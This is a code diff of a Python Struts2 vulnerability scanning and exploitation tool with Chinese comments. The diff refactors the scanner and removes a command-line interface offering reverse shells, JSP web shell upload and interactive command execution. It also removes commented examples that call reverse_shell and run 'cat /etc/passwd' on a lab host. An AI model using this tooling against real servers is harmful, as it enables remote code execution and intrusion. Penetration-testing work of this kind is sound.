@@ -47,6 +47,18 @@ is_quiet = False
 process = 10
 
 
+def result_return(struct) -> dict:
+    """返回结果"""
+    if struct.check():
+        result = {
+            'vulnname': type(struct).__name__,
+            "isvul": struct.is_vul,
+            'url': struct.url,
+            'poc':struct.check_poc if hasattr(struct, 'check_poc') else None,
+            'payload':struct.exec_payload if hasattr(struct, 'exec_payload') else None,
+        }
+        return result
+    
 def get(url, headers=None, encoding='UTF-8'):
     """GET请求发送包装"""
     try:
@@ -1422,21 +1434,24 @@ def check_one(s):
     return result
 
 
-def scan_one(url, data=None, headers=None, encoding="UTF-8"):
+def scan_one(url, data = None, headers = None, encoding="UTF-8"):
     """扫描单个URL漏洞"""
     click.secho('[+] 正在扫描URL:' + url, fg='green')
     ss = [s(url, data, headers, encoding) for s in s2_list]
     with futures.ThreadPoolExecutor(max_workers=10) as executor:
-        results = list(executor.map(check_one, ss))
-    results = {r for r in results if r}
+        results = list(executor.map(result_return, ss))
+    results = [r for r in results if r if r["isvul"]]
     click.secho('[*] ----------------results------------------'.format(url=url), fg='green')
-    if (not results) and (not is_quiet):
-        click.secho('[*] {url} 未发现漏洞'.format(url=url), fg='red')
+    # TODO - 感觉没什么用
+    # if (not results) and (not is_quiet):
+    #     click.secho('[*] {url} 未发现漏洞'.format(url=url), fg='red')
+    #     return []
     for r in results:
-        if r.startswith("ERROR:"):
-            click.secho('[ERROR] {url} 访问出错: {error}'.format(url=url, error=r[6:]), fg='red')
-        else:
-            click.secho('[*] {url} 存在漏洞: {name}'.format(url=url, name=r), fg='red')
+        # if r.startswith("ERROR:"):
+        #     click.secho('[ERROR] {url} 访问出错: {error}'.format(url=url, error=r[6:]), fg='red')
+        # else:
+        click.secho('[*] {url} 存在漏洞: {name}'.format(url=url, name= r['vulnname']), fg='red')
+    return results
 
 
 def scan_more(urls, data=None, headers=None, encoding="UTF-8"):
@@ -1444,273 +1459,60 @@ def scan_more(urls, data=None, headers=None, encoding="UTF-8"):
     scan = partial(scan_one, data=data, headers=headers, encoding=encoding)
     with futures.ProcessPoolExecutor(max_workers=process) as executor:
         results = list(executor.map(scan, urls))
+    return results
 
 
 CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])
 
 
-@click.command(context_settings=CONTEXT_SETTINGS)
-@click.option('-i', '--info', is_flag=True, help="漏洞信息介绍")
-@click.option('-v', '--version', is_flag=True, help="显示工具版本")
-@click.option('-u', '--url', help="URL地址")
-@click.option('-n', '--name', help="指定漏洞名称, 漏洞名称详见info")
-@click.option('-f', '--file', help="批量扫描URL文件, 一行一个URL")
-@click.option('-d', '--data', help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}")
-@click.option('-c', '--encode', default="UTF-8", help="页面编码, 默认UTF-8编码")
-@click.option('-p', '--proxy', help="HTTP代理. 格式为http://ip:port")
-@click.option('-t', '--timeout', help="HTTP超时时间, 默认10s")
-@click.option('-w', '--workers', help="批量扫描进程数, 默认为10个进程")
-@click.option('--header', help="HTTP请求头, 格式为: key1=value1&key2=value2")
-@click.option('-e', '--exec', is_flag=True, help="进入命令执行shell")
-@click.option('--webpath', is_flag=True, help="获取WEB路径")
-@click.option('-r', '--reverse', help="反弹shell地址, 格式为ip:port")
-@click.option('--upfile', help="需要上传的文件路径和名称")
-@click.option('--uppath', help="上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp")
-@click.option('-q', '--quiet', is_flag=True, help="关闭打印不存在漏洞的输出，只保留存在漏洞的输出")
-def main(info, version, url, file, name, data, header, encode, proxy, exec, reverse, upfile, uppath, quiet, timeout,
-         workers, webpath):
-    """Struts2批量扫描利用工具"""
-    global proxies, is_quiet, _tiemout, process
-    if not encode:
-        encode = 'UTF-8'
-    if info:
-        show_info()
-        exit(0)
-    if version:
-        click.secho("[+] Struts2 Scan V0.1", fg='green')
-        exit(0)
-    if proxy:
-        proxies = {
-            "http": proxy,
-            "https": proxy
-        }
-    if quiet:
-        is_quiet = True
-    if timeout and check_int('timeout', timeout):
-        _tiemout = check_int('timeout', timeout)
-    if workers and check_int('workers', workers):
-        process = check_int('workers', workers)
-    if url and not name:
-        scan_one(url, data, header, encode)
-    if file:
-        urls = read_urls(file)
-        scan_more(urls, data, header, encode)
-    if name and url:
-        # 指定漏洞利用
-        name = name.upper().replace('-', '_')
-        if name not in s2_list:
-            click.secho("[ERROR] 暂不支持{name}漏洞利用".format(name=name), fg="red")
-            exit(0)
-        s = s2_dict[name](url, data, header, encode)
-        s.check()
-        if not s.is_vul:
-            click.secho("[ERROR] 该URL不存在{name}漏洞".format(name=name), fg="red")
-        if webpath:
-            if name in webpath_names:
-                web_path = s.get_path()
-                click.secho("[*] {webpath}".format(webpath=web_path), fg="red")
-                exit(0)
-            else:
-                click.secho("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name), fg="red")
-                exit(0)
-        if reverse:
-            if name in reverse_names:
-                click.secho("[*] 请在反弹地址处监听端口如: nc -lvvp 8080", fg="red")
-                if ':' not in reverse:
-                    click.secho("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080", fg="red")
-                ip = reverse.split(':')[0].strip()
-                port = reverse.split(':')[1].strip()
-                s.reverse_shell(ip, port)
-                exit(0)
-            else:
-                click.secho("[ERROR] 漏洞{name}不支持反弹shell".format(name=name), fg="red")
-                exit(0)
-        if upfile and uppath:
-            if name in upload_names and check_file(upfile):
-                result = s.upload_shell(uppath, upfile)
-                if result is True:
-                    click.secho("[+] 文件上传成功!", fg="green")
-                    exit(0)
-                elif str(result).startswith("ERROR:"):
-                    click.secho("[ERROR] 文件上传失败! {error}".format(error=result[6:]), fg="red")
-                    exit(0)
-                else:
-                    click.secho("[ERROR] 文件上传失败! \n{error}".format(error=result), fg="red")
-                    exit(0)
-            else:
-                click.secho("[ERROR] 漏洞{name}不支持文件上传".format(name=name), fg="red")
-                exit(0)
-        if exec:
-            if name in exec_names:
-                if name == "S2_052":
-                    click.secho("[+] 提示: S2_052命令执行无回显，可将结果写入文件访问", fg='red')
-                while True:
-                    cmd = input('>>>')
-                    result = s.exec_cmd(cmd)
-                    click.secho(result, fg='red')
-            else:
-                click.secho("[ERROR] 漏洞{name}不支持命令执行".format(name=name), fg="red")
-                exit(0)
-        click.secho(s.info, fg='green')
-        exit(0)
+# @click.command(context_settings=CONTEXT_SETTINGS)
+# @click.option('-u', '--url', help="URL地址")
+# @click.option('-f', '--file', help="批量扫描URL文件, 一行一个URL")
+# @click.option('-d', '--data', help="POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}")
+# @click.option('-c', '--encode', default="UTF-8", help="页面编码, 默认UTF-8编码")
+# @click.option('-p', '--proxy', help="HTTP代理. 格式为http://ip:port")
+# @click.option('-t', '--timeout', help="HTTP超时时间, 默认10s")
+# @click.option('-w', '--workers', help="批量扫描进程数, 默认为10个进程")
+# @click.option('--header', help="HTTP请求头, 格式为: key1=value1&key2=value2")
+# @click.option('-e', '--exec', is_flag=True, help="进入命令执行shell")
+# @click.option('-q', '--quiet', is_flag=False, help="关闭打印不存在漏洞的输出，只保留存在漏洞的输出")
+# def main(info, url, file, data, header, encode, proxy, quiet, timeout,workers) -> dict :
+#     """Struts2批量扫描利用工具"""
+#     global proxies, is_quiet, _tiemout, process
+#     result  = []
+#     if not encode:
+#         encode = 'UTF-8'
+#     if info:
+#         show_info()
+#         exit(0)
+#     if proxy:
+#         proxies = {
+#             "http": proxy,
+#             "https": proxy
+#         }
+#     if quiet:
+#         is_quiet = True
+#     if timeout and check_int('timeout', timeout):
+#         _tiemout = check_int('timeout', timeout)
+#     if workers and check_int('workers', workers):
+#         process = check_int('workers', workers)
+#     if url:
+#         result = scan_one(url, data, header, encode)
+#     if file:
+#         urls = read_urls(file)
+#         result.append(scan_more(urls, data, header, encode))
 
 class Scan:
-    def run(self,target_url:str):
-        target_url=target_url.strip("/")+"/"
-        try:
-            scan_one(target_url)
-        except KeyboardInterrupt as e:
-            exit(0)
-        except Exception as e:
-            click.secho("[ERROR] {error}".format(error=e), fg='red')
-            exit(0)
-
-if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt as e:
-        exit(0)
-    except Exception as e:
-        click.secho("[ERROR] {error}".format(error=e), fg='red')
-        exit(0)
-
-# s = S2_001("http://192.168.100.8:8080/login.action")
-# print(s.info)
-# print(s.check())
-# print(s.get_path())
-# print(s.exec_cmd('ls -al'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-
-# s =  S2_003("http://192.168.100.8:8080/showcase.action")
-# print(s.check())
-# print(s.exec_cmd('ls -la'))
-
-# s = S2_005("http://192.168.100.8:8080/example/HelloWorld.action")
-# print(s.check())
-# print(s.get_path())
-# print(s.exec_cmd('ls -al'))
-
-
-# s = S2_007("http://192.168.100.8:8080/user.action", "name=admin&email=admin&age={exp}")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_008("http://192.168.100.8:8080")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_009("http://192.168.100.8:8080/ajax/example5.action?age=123", "name")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_012("http://192.168.100.8:8080/S2-012/user.action?name=")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_013("http://192.168.100.8:8080/S2-013/link.action")
-# s.check()
-# print(s.get_path())
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-
-# s = S2_015("http://192.168.100.8:8080/param.action")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_016("http://192.168.100.8:8080/index.action")
-# s.check()
-# print(s.get_path())
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-# print(s.exec_cmd1('ls -la'))
-# print('---------------------')
-# print(s.exec_cmd2('ls -la'))
-# print('---------------------')
-# print(s.exec_cmd3('ls -la'))
-# print(s.upload_shell1('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-
-
-# s = S2_019("http://192.168.100.8:8080/example/HelloWorld.action")
-# print(s.get_path())
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-
-
-# s = S2_029("http://192.168.100.8/default.action")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-
-# s = S2_032("http://192.168.100.8:8080/index.action")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# print(s.get_path())
-# s.reverse_shell('192.168.100.8', '8888')
-
-
-# s = S2_033("http://192.168.100.8/orders/3")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-
-# s = S2_037("http://192.168.100.8:8080/orders/3/")
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# print(s.get_path())
-# s.reverse_shell('192.168.100.8', '8888')
-
-
-# s = S2_045("http://192.168.100.8/memoshow.action")
-# s.check()
-# print(s.get_path())
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-
-
-# s = S2_046("http://192.168.100.8/doUpload.action")
-# s.check()
-# print(s.get_path())
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-# print(s.upload_shell('/usr/local/tomcat/webapps/ROOT/shell.jsp', 'shell.jsp'))
-
-# s = S2_052('http://192.168.100.8/orders/3/edit')
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_048("http://192.168.100.8/integration/saveGangster.action", data='name={exp}&age=123&__checkbox_bustedBefore=true&description=123')
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_048("http://192.168.100.8/integration/saveGangster.action", data='name={exp}&age=123&__checkbox_bustedBefore=true&description=123')
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_053("http://192.168.100.8", data='name={exp}')
-# s.check()
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_devMode("http://192.168.100.8/orders")
-# print(s.get_path())
-# print(s.exec_cmd('ls -la'))
-# s.reverse_shell('192.168.100.8', '8888')
-
-# s = S2_057("http://192.168.100.8:8080/showcase/actionChain1.action")
-# print(s.check())
-# print(s.exec_cmd("cat /etc/passwd"))
-# s.reverse_shell("192.168.100.8", 9999)
+    def run(self,url = None, file = None, data = None, header = None) -> dict :
+        """Struts2批量扫描利用工具"""
+        result = None
+        if url != None:
+            result = scan_one(url, data, header)
+        if file != None:
+            urls = read_urls(file)
+            result.append(scan_more(urls, data, header))
+        return result
+        
+# if __name__ == '__main__':
+#     res = Scan.run("http://127.0.0.1:8080/login.action")
+#     print(res)
